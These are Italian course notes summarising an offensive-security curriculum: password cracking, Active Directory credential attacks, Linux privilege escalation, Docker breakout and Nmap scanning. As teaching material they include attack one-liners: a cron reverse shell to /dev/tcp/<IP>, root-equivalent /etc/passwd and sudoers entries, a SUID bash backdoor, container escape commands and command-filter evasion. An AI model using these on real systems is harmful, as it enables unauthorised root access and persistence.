# 🛡️ Report Dettagliato degli Argomenti – Corso di Vulnerabilità (Anno 3)

Il presente documento costituisce il resoconto analitico e approfondito di tutto il materiale, gli appunti, le esercitazioni pratiche, i laboratori MATLAB/Simulink, i seminari specialistici e le simulazioni d'esame boot-to-root presenti nella cartella `ARCHIVIO/VULNERABILITÀ`.

---

## 📌 Indice Generale della Struttura del Corso

1. **MODULO 1: Sicurezza dei Sistemi Operativi, Autenticazione, Privilege Escalation e Container**
   - Lezione 1: Fondamenti di amministrazione Linux, permessi e gestione di sistema
   - Lezione 2: Teoria delle password, hashing, attacchi offline/online e sicurezza Windows/Active Directory
   - Lezione 3: Privilege Escalation in Linux – Fasi, Restricted Shell Escape ed Enumerazione approfondita
   - Lezione 4: Finding Attack Vectors – Sfruttamento di vettori locali, misconfigurazioni e binari
   - Lezione 5: Container Security, architettura Docker, meccanismi di isolamento e Docker Breakout
   - Esercitazioni pratiche Modulo 1: Comandi operativi, cronjob, SUID e GTFOBins
2. **MODULO 2: Sicurezza di Rete, Web Security, Web Exploitation e Livello Fisico/Wireless**
   - Lezione 1: Network Security, porte, socket, comandi di rete e ricognizione DNS (Forward, Reverse, AXFR)
   - Lezione 2: Host Discovery, Port Scanning con Nmap, TCP/UDP scanning, tecniche di evasione ed enumerazione servizi
   - Lezione 3: Network Traffic Analysis & Sniffing (tcpdump, Wireshark, filtri, statistiche e flussi)
   - Lezione 4: Shell remote (Bind vs Reverse) e tecniche di Pivoting (Tunneling, Port Forwarding Locale/Remoto, Proxying)
   - Lezione 5: Web Enumeration, protocollo HTTP, codici di stato, Virtual Host e Directory Busting (Gobuster, Wfuzz, Feroxbuster)
   - Lezione 6: Web Injection – OS Command Injection e SQL Injection (In-band, Out-of-band, Blind, information_schema)
   - Lezione 7: Web Exploitation avanzata – LFI, RFI, Path Traversal, PHP Wrappers, Log Poisoning, SSRF e WordPress
   - Lezione 8: Reti di Calcolatori, ciclo di richiesta Web, protocollo ARP e attacchi, comunicazioni Wireless, SDR, fisica EM e modulazioni digitali (ASK, FSK, PSK, QAM)
   - Esercitazioni pratiche Modulo 2: Comandi per DNS, scansioni di rete, listener e reverse shell
3. **MODULO 3: Sicurezza Wireless Avanzata, Software Defined Radio (SDR), Laboratori Simulink e Seminari**
   - Lezione 1: Teoria delle SDR, conversione DAC/ADC, teorema di Nyquist-Shannon e architetture RF
   - Seminario 1: Sicurezza delle reti mobili 4G/5G, 5GMap, IMSI Catcher, MITM radio over-the-air e DNS Spoofing via malleabilità cifrari a stream XOR
   - Seminario 2: Sicurezza del 5G Positioning, segnali PRS, Time of Arrival (ToA), attacchi Meaconing/Replay e mitigazioni hardware/FPGA
   - Laboratorio 1 (MATLAB/Simulink): Setup RTL-SDR, analisi spettrale, noise floor, stima SNR e simulazione attacco di Jamming (Broadband e Selective)
   - Laboratorio 2 (MATLAB/Simulink): Modulazione BPSK, canale AWGN, simulazione curve BER vs Eb/N0, protocolli ad accesso multiplo e simulazione DSSS (Spreading e De-spreading)
   - Laboratorio 3 (MATLAB/Simulink): Ricevitore DBPSK reale con RTL-SDR, demodulazione differenziale, estrazione preambolo e decodifica messaggi ASCII, esperimenti di attacco over-the-air (Overshadowing, Noise Jamming, Annihilation)
   - Modulo 3 Short: Formulario compatto, definizioni e sintesi rapida per l'orale
4. **AREA ESAME: Metodologie Boot-to-Root, Compendio Operativo e Simulazioni d'Esame Risolte**
   - File utile per le esercitazioni: Prontuario comandi, sintassi strumenti e sequenze d'attacco
   - Report Utility: Compendio completo di 1800+ righe con spiegazione, impatto, evidenze e mitigazioni per ogni vulnerabilità
   - Template Report: Modello strutturato per la redazione della relazione d'esame
   - Simulazione Esame 1: Walkthrough dettagliato con Nmap, Feroxbuster, backup leak, FTP, SSH key leak, SUID path hijacking, pspy, root cronjob, Keepass2john e MIME bypass
   - Simulazione Esame 2: Walkthrough dettagliato con Nmap top-1000, Virtual Host discovery (--ad), Casdoor IAM CVE-2026-6815 (Arbitrary File Write su authorized_keys), SSH initial access, sudo abuse con mawk, DNS AXFR su porta non standard e SQLi login bypass

---

## 1. MODULO 1: Sicurezza OS, Password, Privilege Escalation e Container

### Lezione 1 – Fondamenti di Linux, Amministrazione di Sistema e Permessi
- **Navigazione e manipolazione file:** `pwd`, `ls -la`, `touch`, `cat`, `echo`, `awk`, ricerca con `find`, ispezione del formato binario con `binwalk` e `file`.
- **Variabili d'ambiente e `$PATH`:** Funzionamento della ricerca degli eseguibili nel sistema; comando `export`; implicazioni di sicurezza legate all'inserimento di percorsi scrivibili in cima al PATH (vettore base di hijacking).
- **Gestione dei permessi e proprietà:**
  - Triade utente / gruppo / altri (owner, group, others) con permessi numerici (Read = 4, Write = 2, Execute = 1).
  - Comandi `chmod` e `chown`.
  - Bit speciali **SUID** (Set User ID) e **SGID** (Set Group ID): esecuzione con i privilegi del proprietario o del gruppo del file anziché dell'utente chiamante (`rwsr-xr-x`).
  - Comando `find` avanzato per censire file SUID/SGID di root con redirezione degli errori (`2>/dev/null`).
- **Gestione utenti e identità:** `id`, `whoami`, `groups`, creazione utenti con `adduser`, cambio utente con `su`.
- **Filesystem e Inode:** Concetto di Inode (metadati, permessi, blocchi disco); differenza tra **Hard Link** (stesso inode, stesso file fisico) e **Symbolic Link** (link simbolico a percorso, inode differente).
- **Gestione archivi e compressione:** Utilizzo di `tar` (creazione con `zcf`, ispezione con `tf`), visualizzazione rapida con `zcat` e `zless`, estrazione di archivi `.zip` con `unzip`.
- **Gestione processi:** `ps aux` (opzioni `a`, `u`, `x`), controllo job (`Ctrl+Z`, `bg`, `fg`), terminazione di processi con `kill` e `kill -9` (SIGKILL).
- **Monitoraggio risorse di sistema:** `df -h` (spazio dischi), `du -sh` (occupazione cartelle), esecuzione ciclica con `watch`.
- **Networking di base:** `ip a` (interfacce), `ip r` (tabella di routing), `netstat -tulpn` (porte aperte in ascolto TCP/UDP e PID dei processi associati).
- **Accesso remoto e amministrazione:** `ssh`, comando `sudo`, verifica dei privilegi assegnati con `sudo -l`, configurazione sicura del file `/etc/sudoers` tramite `visudo`.
- **Automazione e schedulazione:** Sintassi di `crontab` (minuto, ora, giorno del mese, mese, giorno della settimana, comando).

---

### Lezione 2 – Password, Cracking Offline/Online e Sicurezza Windows/Active Directory
- **Teoria delle password e autenticazione:**
  - Concetto di *shared secret* tra utente e fornitore del servizio.
  - Spazio di ricerca e probabilità di indovinare una password ($\frac{1}{2^N}$).
  - Problema del *password overload* e cattive abitudini umane (scarsa casualità, pattern prevedibili).
  - Misura dell'entropia crittografica.
- **Wordlist e generazione mirata:**
  - Differenza tra dizionari generici e *custom wordlists*.
  - `Crunch`: generazione esaustiva basata su lunghezza minima/massima e charset matematico.
  - `CeWL` (*Custom Word List generator*): web crawling ricorsivo per estrarre parole contestuali da siti target.
  - `Username-Anarchy`: generazione automatica di username basati su naming convention aziendali (es. nome.cognome, iniziale cognome).
- **Attacchi Online vs Offline:**
  - *Online:* invio continuo di richieste di autenticazione al servizio (es. SSH, FTP, HTTP con **Hydra**). Limiti: latenza di rete, alta visibilità nei log, rischio di lockout dell'account.
  - *Offline:* cattura del digest crittografico e tentativo locale ad altissima velocità su macchine dell'attaccante (GPU/CPU) senza interagire col bersaglio.
- **Crittografia delle password su Linux:**
  - Funzioni di hash one-way con digest a lunghezza fissa.
  - Ruolo del **salt**: stringa casuale aggiunta alla password ($H(\text{password} \parallel \text{salt})$) per impedire attacchi basati su Rainbow Tables e hash collision precalcolate (es. CrackStation).
  - File `/etc/passwd` (pubblico, descrive account e shell, password contrassegnata da `x`).
  - File `/etc/shadow` (riservato esclusivamente a root, formato `$id$salt$digest`).
  - Algoritmi di hash riconosciuti tramite prefisso: `$1$` (MD5), `$2a$/$2y$` (Blowfish), `$5$` (SHA-256), `$6$` (SHA-512), `$y$` (yescrypt).
  - Funzionamento del motore di verifica delle password in fase di login.
- **Cracking avanzato con John the Ripper:**
  - Utilità `unshadow` per unire `/etc/passwd` e `/etc/shadow` in un file compatibile.
  - Modalità *Single Crack* (`--single`): test rapido basato su mutazioni del nome utente e delle informazioni GECOS.
  - Modalità *Dictionary* (`--wordlist`): attacco a dizionario con applicazione di regole (`--rules`).
  - Modalità *Incremental* (`--incremental`): brute force combinatorio su tutto il charset.
  - Definizione di *Custom Rules* in `john.conf`: regole di capitalizzazione (`c`), prefisso (`A0`), suffisso (`Az`), sostituzione l33t (`sXY`), inserimento set (`[xyz]`).
- **Cracking avanzato con Hashcat:**
  - Tipologie di attacco: straight/dictionary (`-a 0`), combinazione (`-a 1`), ibrido wordlist + mask (`-a 6`).
  - Codici algoritmi (`-m 0` per MD5, NTLM, SHA-256, ecc.), utilizzo di maschere (`?d?d?d?d`) e output su file.
- **Cracking di file compressi protetti:**
  - Estrazione dell'hash con `zip2john` e `7z2john`.
  - Attacco a dizionario con John the Ripper o brute force con `fcrackzip`.
- **Sicurezza in ambiente Windows e Active Directory:**
  - Concetto di Dominio, Domain Controller e Active Directory (gestione centralizzata di identità e policy).
  - Storage locale delle credenziali: **SAM** (*Security Account Manager*) su macchine standalone.
  - Storage di dominio: file di database **NTDS.dit** sul Domain Controller.
  - Differenza tra formato hash a riposo (**NT Hash**) e protocollo di rete (**NTLM**).
  - **Pass-the-Hash (PtH):** tecnica di riutilizzo diretto dell'hash NT per autenticarsi su altre macchine della rete senza decifrare la password in chiaro, sfruttando l'architettura Single Sign-On (SSO).
  - **Post-exploitation & Dumping credenziali:** estrazione dei registri SAM e SYSTEM con **Mimikatz** (`lsadump::sam`).
  - **Protocollo Net-NTLM (v1 e v2):** meccanismo di challenge-response a 3 vie (Server Challenge, Client Challenge, calcolo della response basata sull'NT Hash).
  - **Attacco di Poisoning locale con Responder:** sfruttamento dei protocolli di fallback broadcast/multicast (LLMNR e NBT-NS) quando la risoluzione DNS fallisce; invio di risposte fasulle per indurre la vittima a connettersi all'attaccante, catturando la risposta Net-NTLMv2 per il cracking offline.

---

### Lezione 3 – Processo di Privilege Escalation, Shell Escape ed Enumerazione Linux
- **Metodologia sistematica di Privilege Escalation:**
  1. *Enumeration:* censimento esaustivo di ogni dettaglio del sistema target.
  2. *Finding Attack Vectors:* correlazione e interpretazione critica delle informazioni per isolare vulnerabilità.
  3. *Exploit Them:* applicazione mirata dell'exploit per scalare i privilegi verso root.
- **Identificazione ambiente e shell:**
  - Variabili `$SHELL`, `$0`, esecuzione di `/bin/bash` o `/bin/sh`.
  - **Restricted Shell (rbash):** limitazioni imposte su comandi eseguibili, cambio directory e uso di percorsi assoluti.
- **Tecniche di Restricted Shell Escape:**
  - Evasione tramite editor di testo: `vi -c '!/bin/bash'`, comandi esterni in `nano` (`Ctrl+T`).
  - Generazione di TTY interattiva con Python: `python3 -c "import pty; pty.spawn('/bin/bash')"`.
  - Creazione di TTY tramite utility di sistema: `script -qc /bin/bash /dev/null`.
- **Tecniche di bypass filtri e offuscamento comandi:**
  - Uso di wildcard nei percorsi binari (`/bin/b?sh`, `/bin/b[a]sh`).
  - Espansione di variabili vuote per ingannare i controlli a stringa (`p${u}i${u}n${u}g`).
  - Concatenazione da cronologia bash (`!-1!-2`) e apici singoli (`w'h'o'a'm'i`).
  - **Bypass del carattere spazio:** utilizzo della variabile `$IFS` (`cat${IFS}/etc/passwd`), riassegnazione di IFS (`IFS=];...`), espansione a graffe (`{cat,file}`), redirezione input (`cat</etc/passwd`).
  - Esecuzione di stringhe codificate in esadecimale (`$'\x2f\x62\x69\x6e\x2f\x6c\x73'`) con supporto di tool come CyberChef.
- **Enumerazione esaustiva del sistema Linux:**
  - *Identità e permessi correnti:* `whoami`, `id`, `groups`, analisi di `/etc/passwd`.
  - *Informazioni OS e kernel:* `uname -a`, `uname -r`, `cat /etc/*release`, `cat /proc/version`, `lsb_release -a`.
  - *Messaggi e banner di login:* lettura di `/etc/motd` e `/etc/update-motd.d/*` per leak di configurazioni o credenziali.
  - *File scrivibili e recenti:* ricerca globale con `find / -writable 2>/dev/null`, file modificati recentemente (`-mtime`, `-mmin`, `-newermt`).
  - *Cronologia e file sensibili:* ispezione di `~/.bash_history`, credenziali in chiaro, variabili con `printenv`.
  - *Filesystem e punti di mount:* `/etc/fstab`, comandi `mount`, `findmnt`, ispezione cartelle mail (`/var/mail`, `/var/spool/mail`) e web (`/var/www`).
  - *Log di sistema e autenticazione:* monitoraggio accessi con `who`, `last`, `lastlog`, `lastb`, analisi di `/var/log/auth.log` (tentativi login, `chpasswd`, attività root) e syslog in tempo reale (`tail -f`).
  - *Sudo, SUID e SGID:* ispezione permessi concessi con `sudo -l`, verifica versione `sudo -V` (rilevamento CVE), configurazioni in `/etc/sudoers` e `/etc/sudoers.d/*`, scansione binari con SUID di root.
  - *Processi e servizi interni:* `ps aux`, `ps -ef`, monitoraggio socket con `lsof -p`, `lsof -i`, `netstat -tulpn`, servizi attivi in `/etc/services`, pacchetti aggiornabili con `apt list --upgradable`.
  - *Approccio "Living off the land":* riutilizzo di strumenti e linguaggi già installati nel sistema target (`/usr/bin`, `/sbin`, python, perl, gcc, curl, wget).
  - *Rete locale e laterale:* interfacce (`ip a`), tabella ARP (`arp -a`), instradamento (`ip r`), regole di filtraggio (`iptables -L -v -n`), packet sniffing locale (`tcpdump -i lo -A`).
  - *Configurazioni SSH e credenziali:* `/etc/ssh/sshd_config` (PermitRootLogin, porte), ricerca chiavi private esposte (`id_rsa`, permessi 600) e chiavi pubbliche (`authorized_keys`).
  - *Database locali:* ricerca di database SQLite/file `.db`, file di configurazione MySQL (`/etc/mysql/my.cnf`, `/etc/mysql/debian.cnf` con password di manutenzione).
  - *Attività schedulate (Cronjobs):* `crontab -l`, `/etc/crontab`, cartelle `/etc/cron*`, `/var/spool/cron/*`.
  - *Linux Capabilities:* suddivisione granulare del potere di root; comandi `getcap -r /`, `capsh --decode`, `setcap`; analisi dei set di capability: *Inherited* (CapInh), *Effective* (CapEff), *Permitted* (CapPrm), *Bounding* (CapBnd), *Ambient* (CapAmb).
  - *Tool di automazione per l'enumerazione:* `LinPEAS` (scansione automatica approfondita) e `pspy` (monitoraggio real-time di processi e cronjob in background senza permessi di root); bilanciamento tra rumorosità dei tool automatici e discrezione dell'enumerazione manuale.

---

### Lezione 4 – Finding Attack Vectors: Kernel Exploit, Misconfigurazioni, Abuso di Binari e Capabilities
- **Distinzione metodologica:** passaggio da semplice raccolta di informazioni (*Enumeration*) all'analisi logica per individuare punti di rottura sfruttabili (*Attack Vectors*).
- **Kernel Exploits:**
  - Definizione e funzionamento: programmi che sfruttano bug specifici nel codice del kernel Linux per acquisire privilegi di root.
  - Ricerca con `searchsploit` e database Exploit-DB.
  - Analisi della celebre vulnerabilità **Dirty COW** (CVE-2016-5195): race condition nel sottosistema del kernel durante la gestione del *Copy-on-Write* (COW), che consente la scrittura arbitraria su file di sola lettura (es. sovrascrittura di `/etc/passwd`).
  - Valutazione dei rischi operativi: instabilità del sistema operativo, rischio di kernel panic/crash irreversibile, tracce evidenti nei log.
- **Sfruttamento di permessi di scrittura anomali su file di sistema:**
  - *Aggiunta di un utente fittizio in `/etc/passwd`:* generazione dell'hash con `openssl passwd -1` o `mkpasswd`, inserimento della riga con **UID e GID pari a 0** (`hacker:<hash>:0:0:root:/root:/bin/bash`) per ottenere immediatamente privilegi equivalenti a root.
  - *Modifica di `/etc/sudoers`:* inserimento della direttiva permissiva `utente ALL=(ALL) NOPASSWD:ALL` per bypassare qualsiasi richiesta di password nell'esecuzione di qualsiasi comando con `sudo`.
  - *Creazione di backdoor SUID manuale:* copia di `/bin/bash` in cartella utente, impostazione del bit SUID con `chmod 4777` ed esecuzione con flag di mantenimento privilegi `~/myBash -p`.
- **Tecnica del PATH Hijacking:**
  - Condizione di vulnerabilità: script o binario eseguito con privilegi elevati (es. root o SUID) che invoca comandi di sistema senza percorso assoluto (es. `cat` invece di `/bin/cat`).
  - Meccanismo: l'interprete legge le directory nella variabile d'ambiente `$PATH` in ordine sequenziale da sinistra a destra.
  - Vettore di attacco: creazione di un falso eseguibile con lo stesso nome in una directory controllata dall'attaccante (es. `/tmp`), aggiunta di tale directory all'inizio del PATH (`export PATH=/tmp:$PATH`) e attivazione dello script per l'esecuzione del payload controllato.
- **Abusi di Wildcard e Parsing non sicuro:**
  - Abuso di comandi eseguiti con wildcard bash (`*`): iniezione di nomi di file che vengono interpretati come opzioni da riga di comando.
  - *7zip file list injection:* creazione di un file `@tosteal` contenente percorsi protetti (es. `/etc/passwd`); quando il comando `7za a backup.7z *` viene eseguito, il parametro `@` forza 7zip a leggere e archiviare il file sensibile indicato.
- **Exploitation in ambiente Python:**
  - *Python 2 input() vulnerability:* la funzione `input()` in Python 2 valuta l'input come codice nativo (`eval`), consentendo l'iniezione diretta di codice (`__import__('os').system('/bin/bash')`).
  - *Module Override / Import Hijacking:* ordine di ricerca dei moduli in `sys.path` (directory corrente, built-in, PYTHONPATH, librerie di sistema); creazione di un file malevolo con lo stesso nome del modulo importato per intercettare l'esecuzione quando lo script gira con privilegi superiori.
  - *Script Replacement:* modifica o sovrascrittura di script Python eseguiti con `sudo` o tramite cronjob di root.
- **Sfruttamento di Cronjob:**
  - Individuazione di file o cartelle con permessi di scrittura appartenenti a task schedulati di root; inserimento di comandi di reverse shell o alterazione delle configurazioni di sistema senza dover "bucare" il binario.
- **Insecure Binary Permissions e portale GTFOBins:**
  - Consultazione del catalogo online [GTFOBins](https://gtfobins.github.io/) per identificare tecniche di:
    - Shell Escape
    - Arbitrary File Read / File Write
    - Sudo execution abuse
    - SUID/SGID exploitation
- **Abuso mirato delle Linux Capabilities:**
  - Concetto di capability come "frammentazione" del potere di root.
  - *`cap_setuid`:* permette a un binario non root di modificare il proprio UID a 0 (es. tramite un interprete Python: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`).
  - *`cap_dac_read_search`:* consente il bypass totale dei controlli di lettura del filesystem (es. archiviazione e lettura di `/etc/shadow` tramite `tar`).
  - *`cap_dac_override`:* permette la modifica arbitraria di qualsiasi file di sistema ignorando i permessi di scrittura (es. alterazione di `/etc/passwd` tramite `vim`).

---

### Lezione 5 – Container Security, Meccanismi di Isolamento Linux e Docker Breakout
- **Architettura dei Container rispetto alle Macchine Virtuali (VM):**
  - Le VM virtualizzano l'hardware ed eseguono un intero sistema operativo con kernel dedicato.
  - I container virtualizzano il sistema operativo, isolano i processi applicativi ma **condividono il kernel dell'host**.
  - Assunto critico: *Root all'interno del container $\neq$ Root sull'host reale*, ma la condivisione del kernel introduce rischi sistemici.
- **Funzionamento del Docker Engine:**
  - Architettura Client-Server: CLI client (`docker`) comunica tramite API con il demone di background (`dockerd`).
  - Il demone gira con **privilegi root sull'host** ed è responsabile della creazione, esecuzione e segregazione delle risorse.
  - Dockerfile, Docker Image (template read-only composto da strati `UnionFS`) e Docker Container (istanza con layer read-write effimero).
- **Il socket Unix di Docker (`/var/run/docker.sock`):**
  - Entry-point fondamentale per le chiamate API dirette al demone `dockerd`.
  - Qualsiasi utente o processo con permessi di lettura/scrittura su questo socket possiede de facto il pieno controllo di root sull'host.
- **Riconoscimento dell'ambiente Containerizzato:**
  - Presenza del file `.dockerenv` nella directory root (`/`).
  - Analisi del controller cgroup in `/proc/1/cgroup` (presenza di stringhe `docker` o ID di container).
  - Processo con PID 1: shell applicativa o singolo demone al posto dei gestori di sistema standard (`systemd` o `init`).
  - Numero ridotto di processi attivi nel sistema (`ps aux`).
  - Interfacce di rete virtuali con indirizzamento e MAC address caratteristici.
  - Errori sistematici di "Operation not permitted" nell'invocazione di comandi a basso livello (`mount`, `tcpdump`, `dmesg`).
- **Meccanismi di isolamento del Kernel Linux:**
  - **Namespaces (vista isolata delle risorse di sistema):**
    - *PID Namespace:* isola l'albero dei processi (il container ha il suo PID 1).
    - *NET Namespace:* stack di rete indipendente (interfacce, tabelle IP, porte).
    - *MNT Namespace:* isolamento del filesystem (root `/` indipendente).
    - *UTS Namespace:* isolamento di hostname e domain name.
    - *IPC Namespace:* separazione delle risorse di comunicazione tra processi (memoria condivisa, code di messaggi).
    - *USER Namespace:* mappatura degli UID/GID del container su utenti non privilegiati dell'host.
    - *TIME Namespace:* virtualizzazione degli orologi di sistema e uptime.
    - *CGROUP Namespace:* virtualizzazione della visualizzazione della gerarchia cgroups.
  - **Control Groups (`cgroups`):** limitazione quantitativa, accounting e priorità delle risorse fisiche (CPU, RAM, banda I/O) per prevenire attacchi Denial of Service (DoS) contro l'host.
  - **Capabilities:** sottrazione sistematica dei privilegi pericolosi anche per l'utente root all'interno del container.
- **Tecniche di Docker Breakout (Fuga dal Container verso l'Host):**
  - **Container Privilegiati (`--privileged`):**
    - Rimuove tutte le restrizioni di sicurezza, ripristina tutte le Linux Capabilities e disabilita profili di protezione come Seccomp e AppArmor.
    - Dà accesso completo ai dispositivi a blocchi dell'host in `/dev`.
    - Procedura di exploit: scansione delle partizioni con `fdisk -l`, montaggio diretto del disco rigido dell'host (`mount /dev/sda1 /mnt`) e transizione dell'ambiente tramite `chroot /mnt /bin/bash` per ottenere una root shell nativa sull'host.
  - **Esposizione del Docker Socket (`docker.sock`):**
    - Individuazione del socket montato all'interno del container (`find / -name docker.sock 2>/dev/null`).
    - Interazione diretta con l'API o utilizzo del client Docker per avviare un nuovo container privilegiato con il filesystem dell'host montato come volume:
      `docker run -it --rm -v /:/host alpine chroot /host bash`.
  - **Montaggio di percorsi sensibili dell'host (Sensitive Path Mounts):**
    - Montaggio all'interno del container di directory critiche dell'host (es. `/etc`, `/root`, `/var/spool/cron`).
    - Sfruttamento per l'inserimento di backdoor permanenti, come l'aggiunta di una reverse shell nel file di cron dell'host (`echo "* * * * * root /bin/bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /host_etc/crontab`).

---

### Esercitazioni e Comandi Utili – Modulo 1
- Sequenza metodologica essenziale: Enumeration $\to$ Misconfiguration Discovery $\to$ Lateral Movement $\to$ Escalation.
- Tecniche operative: bind mounting temporaneo (`mount -o bind /bin/sh /bin/mount`), censimento appartenenza a gruppi numerici specifici (`find / -group 42 2>/dev/null`).
- Utilizzo di `pspy64` per intercettare l'esecuzione periodica di script invocati da root e manipolazione dei file correlati per iniezione di payload in append su `/etc/passwd`.
- Abuso di permessi SUID su binari di utilità (`find . -exec /bin/sh -p \; -quit`).

---

## 2. MODULO 2: Sicurezza di Rete, Web Security, Web Exploitation e Livello Fisico/Wireless

### Lezione 1 – Network Security, Comandi di Rete e Ricognizione DNS
- **Fondamenti di comunicazione di rete:**
  - Identificazione host tramite porte applicative standard: 80 (HTTP), 443 (HTTPS), 22 (SSH), 53 (DNS UDP/TCP).
  - Concetto di **Socket:** interfaccia software che lega un processo a un indirizzo IP, una porta e un protocollo di trasporto.
  - Ruolo dei Firewall di rete: filtraggio pacchetti basato su regole e stato della connessione.
- **Strumenti diagnostici e di gestione:**
  - `ping` (richieste ICMP echo per raggiungibilità e misura Round-Trip Time).
  - `traceroute` (mappatura del percorso di rete ed elenco dei router intermedi/hop).
  - Gestione della tabella di associazione IP-MAC: comandi `arp` e `ip neigh`.
  - Configurazione interfacce: `ip a` (standard moderno), `ifconfig` (legacy), `ipconfig` (Windows).
  - Tabelle di instradamento: `ip route` e `route`.
- **Netcat (il "coltellino svizzero" di rete):**
  - Funzionalità client/server TCP e UDP per l'invio e la ricezione di dati raw.
  - Opzioni chiave: `-v` (verbose), `-n` (disabilita DNS lookup), `-l` (listening mode), `-p` (porta locale), `-e` (esecuzione programma con binding I/O su socket).
- **Architettura del Domain Name System (DNS):**
  - Struttura distribuita e gerarchica: Root Domain, Top-Level Domain (TLD), domini di secondo e terzo livello.
  - Componenti: DNS Client, DNS Resolver ricorsivo, DNS Server autoritativo.
  - Tipologie di record DNS: `A` (IPv4), `AAAA` (IPv6), `MX` (Mail Exchange), `PTR` (Reverse lookup IP $\to$ Nome), `CNAME` (Alias), `TXT` (record testuali, note, chiavi di validazione), `SOA` (Start of Authority).
  - Risoluzione interna su Linux: consultazione prioritaria di `/etc/hosts`, cache locale e resolver configurato.
  - Interrogazioni avanzate con `dig` e `host` (`dig hostname`, `dig @server dominio tipo_record`).
- **Tecniche di interazione e ricognizione DNS:**
  - **Forward Lookup Brute Force:** enumerazione di sottodomini mediante wordlist (es. SecLists) automatizzata tramite script bash o tool dedicati per individuare IP e servizi interni.
  - **Reverse Lookup:** scansione ricorsiva di range IP tramite richieste di record PTR per svelare hostname non documentati partendo dai dati forniti dal servizio `whois` (NetRange).
  - **DNS Zone Transfer (AXFR):** richiesta di replica completa del database di zona DNS; se il server è misconfigurato e accetta richieste AXFR da host non autorizzati, l'attaccante ottiene l'intera mappa dell'infrastruttura di rete. Strumenti: `dig @dns-server dominio axfr`, `host -l dominio dns-server`, `dnsrecon`, `dnsenum`, `fierce`. Mitigazione: restrizione delle query AXFR esclusivamente agli indirizzi IP dei server slave autorizzati.

---

### Lezione 2 – Host Discovery, Port Scanning con Nmap ed Enumerazione Servizi
- **Host Discovery:**
  - In rete locale: **ARP Scan**, estremamente veloce, affidabile e non bloccabile dai firewall host-based poiché opera a livello link (broadcast).
  - Verso reti remote: **Ping Scan (ICMP)**, soggetto a falsi negativi a causa di firewall che scartano pacchetti echo request.
- **Meccanica del Port Scanning:**
  - Concetto di **Port Binding:** registrazione di un demone presso il kernel su IP, porta (intervallo da $1$ a $65535$) e protocollo.
  - Porte su interfaccia di loopback (`127.0.0.1`) accessibili solo localmente.
  - **Protocol Awareness:** la scansione deve rispettare il protocollo di trasporto specifico (TCP vs UDP).
- **Handshake TCP a 3 vie e terminazione:**
  - Fasi di connessione: SYN (client $\to$ server) $\to$ SYN/ACK (server $\to$ client) $\to$ ACK (client $\to$ server).
  - Fasi di chiusura controllata: scambio alternato di pacchetti FIN e ACK.
- **Tipologie di scansione con Nmap:**
  - **TCP SYN Scan (`-sS`):** la tecnica di riferimento (default per root); invia SYN, se riceve SYN/ACK risponde immediatamente con RST abortendo la connessione (*Half-open scan*). Minore rumorosità e non completamento della socket applicativa.
  - **TCP Connect Scan (`-sT`):** completa interamente l'handshake a tre vie. Utilizzato obbligatoriamente da utenti non privilegiati (senza permessi raw socket). Più rumoroso e registrato sistematicamente nei log applicativi. Esecuzione manuale anche con netcat (`nc -vv -w1 -n -z <ip> <porte>`).
  - **UDP Scan (`-sU`):** assenza di handshake. L'invio di pacchetti vuoti produce risposte ambigue: se arriva ICMP "Port Unreachable" la porta è *chiusa*; l'assenza di risposta classifica la porta come *open|filtered*.
  - **Stealth Scans (`-sF` FIN, `-sN` NULL, `-sX` XMAS):** invio di pacchetti con flag TCP anomali. Basati sul comportamento dello standard RFC 793 (se la porta è chiusa risponde con RST, se è aperta non risponde). Efficaci su sistemi Unix/Linux, inefficaci su stack Windows.
  - **ACK Scan (`-sA`):** non serve a rilevare porte aperte ma a mappare le regole dei firewall (stateful vs stateless): ricezione di RST indica porta *unfiltered*, assenza di risposta indica *filtered*.
  - **Ping Scan / Host Discovery (`-sn`):** censimento host attivi senza effettuare la scansione delle porte.
- **Stati delle porte:** `open` (servizio in ascolto), `closed` (porta raggiungibile ma nessun demone attivo), `filtered` (presenza di filtri/firewall che bloccano le sonde).
- **Tecniche di Evasione e Anonimizzazione:**
  - *IP Spoofing:* falsificazione dell'indirizzo sorgente nel pacchetto IP.
  - *Decoy Scan (`-D`):* offuscamento della scansione reale mescolandola con richieste provenienti da molteplici indirizzi IP fittizi.
  - *Bypass host discovery (`-P0` / `-Pn`):* disabilitazione del ping iniziale per forzare la scansione di host che scartano ICMP.
  - *Scan Timing (`-T0` a `-T5`):* modulazione dell'intervallo temporale tra le sonde (da *paranoid* per eludere IDS a *insane* per massima velocità).
- **Identificazione Servizi e Sistemi Operativi:**
  - *Banner Grabbing:* lettura della stringa iniziale di identificazione inviata dal servizio al momento della connessione (tramite `nc` o `nmap -sV`).
  - *OS Fingerprinting:* identificazione del sistema operativo target tramite sonde attive (`nmap -O`) o passive (`p0f`) basate su parametri TCP/IP caratteristici (TTL, dimensione finestra, opzioni TCP).
- **Enumerazione di specifici servizi di rete:**
  - **SMB (Server Message Block – porte 139 e 445):** estrazione di share condivise, permessi, utenti di dominio e vulnerabilità tramite script Nmap dedicati (`--script smb*`).
  - **SMTP (Simple Mail Transfer Protocol – porta 25):** enumerazione utenti tramite comandi legacy `VRFY` (verifica esistenza account) ed `EXPN` (espansione mailing list).

---

### Lezione 3 – Network Analysis, Packet Sniffing (tcpdump, Wireshark) e Metriche di Rete
- **Sniffing e ispezione dei pacchetti:**
  - Cattura e analisi dei dati in transito sui livelli 2 (Data Link), 3 (Network) e 4 (Transport) del modello di rete.
  - Distinzione strutturale tra **Header** (metadati di controllo, indirizzi, flag) e **Payload** (contenuto informativo effettivo).
- **Software di cattura da riga di comando: `tcpdump`:**
  - Utilizzo su interfaccia di rete specifica (`-i eth0`), visualizzazione in tempo reale e salvataggio delle catture in file di traccia standard `.pcap`.
- **Analisi strutturata con Wireshark:**
  - Protocol analyzer grafico con dissezione gerarchica di tutti i campi dei protocolli di rete.
  - **Display Filters:** filtraggio dinamico del traffico catturato mediante:
    - Operatori logici: `&&` (AND), `||` (OR), `!` (NOT).
    - Operatori di confronto: `==`, `!=`, `>`, `<`, `>=`, `<=`.
    - Operatori avanzati: `contains`, `in`, `matches` (ricerca basata su espressioni regolari per identificare stringhe specifiche come domini o token).
  - **Follow Stream:** ricostruzione completa delle sessioni di comunicazione end-to-end per stream TCP, UDP, HTTP e TLS.
- **Strumenti analitici e aggregazione del traffico:**
  - *Protocol Hierarchy:* distribuzione percentuale di pacchetti e byte per protocollo, utile a individuare anomalie (es. volumi anomali di pacchetti TCP SYN indicativi di port scanning).
  - *Endpoints:* censimento completo di tutti gli host osservati (IP, MAC, volumi di traffico).
